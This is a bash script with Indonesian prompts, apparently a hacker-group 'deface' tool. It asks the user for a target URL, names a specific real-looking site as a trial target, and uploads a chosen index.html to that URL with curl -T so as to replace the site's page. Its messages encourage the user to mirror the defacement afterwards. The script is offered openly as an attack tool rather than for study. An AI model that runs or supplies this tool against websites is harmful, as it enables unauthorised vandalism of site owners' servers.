green="\033[32;1m"
yellow="\033[33;1m"
blue="\033[34;1m"
red="\033[35;1m"
echo  $red
echo "Tools Akan Mulai Dalam...."
sleep 1.0;
clear
echo  $red
figlet -f future "     5"
sleep 1.0;
clear
echo  $red
figlet -f future "     4"
sleep 1.0;
clear
echo  $red
figlet -f future "     3"
sleep 1.0;
clear
echo  $red
figlet -f future "     2";
sleep 1.0;
clear
echo  $red
figlet -f future "     1";
sleep 1.0;
clear
echo
echo
echo
echo $red"---->(ISI NAMA ANDA)<----";
echo $yellow
read -p "-->$" nama
clear
echo
echo
echo
echo $yellow"Salam Kenal"$green" $nama"$red
sleep 3
echo $blue
figlet -f future "Deface"
echo $red"Author"$yellow":"$blue"Mr.demon"
echo $red"Team"$yellow":"$blue"Bunny Cyber Team"
echo
echo $yellow"["$red"A"$yellow"]"$blue"."$green"Tebas Index"
echo $yellow"["$red"Q"$yellow"]"$blue"."$green"Quit"
echo $yellow"["$red"I"$yellow"]"$blue"."$green"Info"
echo $yellow
read -p "-->$" gila
echo
if [ $gila = "A" ] || [ $gila = "a" ]
then
echo
clear
echo $blue
figlet -f future "Tebas Index"
echo $yellow "Script Ditaruh Diluar Penyimpanan Internal"
echo $red "Target Percobaan"
echo $yellow "http://contsol.co.za"
echo
echo $blue "masukan url"
echo $yellow
read -p "-->$" link
echo
echo $blue "Masukan Nama Script"
echo $green "nama script harus index.html"
echo $yellow
read -p "-->$" html
echo $red
figlet -f future "reCHAPTA"
echo  $blue "5 + 5 =?"
echo
echo "isi angka pertama"
read -p "-->" X
echo "isi angka kedua"
read -p "-->" Y
tambah=$(echo "$X + $Y" | bc)
echo "hasilnya = $tambah"
echo
curl -T /storage/emulated/0/$html $link
echo $yellow "+"$green"Hack Website"$blue" --->"$red" $link"
echo
echo $red"terima kasih telah menggunakan tools saya"
echo $yellow"["$red"O"$yellow"]"$blue"."$green"out"
echo $yellow"["$red"K"$yellow"]"$blue"."$green"Kembali"
read -p "[K/O] : " bacod
fi

if [ $gila = "Q" ] || [ $gila = "q" ]
then
echo $red"deface.id";
echo $red"selamat deface yah jangan lupa mirror";
echo $ree"pesan akan dihapus dalam 5 detik";
sleep 5;
clear
fi

if [ $bacod = "O" ] || [ $bacod = "o" ]
then
echo $red"selamat deface yah jangan lupa mirror"
fi

if [ $bacod = "K" ] || [ $bacod = "k" ]
then
echo $red"Akan Kembali Dalam 5 Detik"
sleep 5
sh DFC.sh
clear
fi

if [ $gila = "I" ] || [ $gila = "i" ]
then
clear
figlet -f future "Info"
sleep 1
echo $red"Pembuat: Mr.demon"
sleep 1
echo $blue"Team: Bunny Cyber Team"
sleep 1
echo $green"Supporter: Islamic Cyber Team"
sleep 1
echo $yellow"date: 30-10-2018"
echo $red"KEMBALI KE TOOLS DALAM 5 DETIK"
sleep 5
sh DFC.sh
fi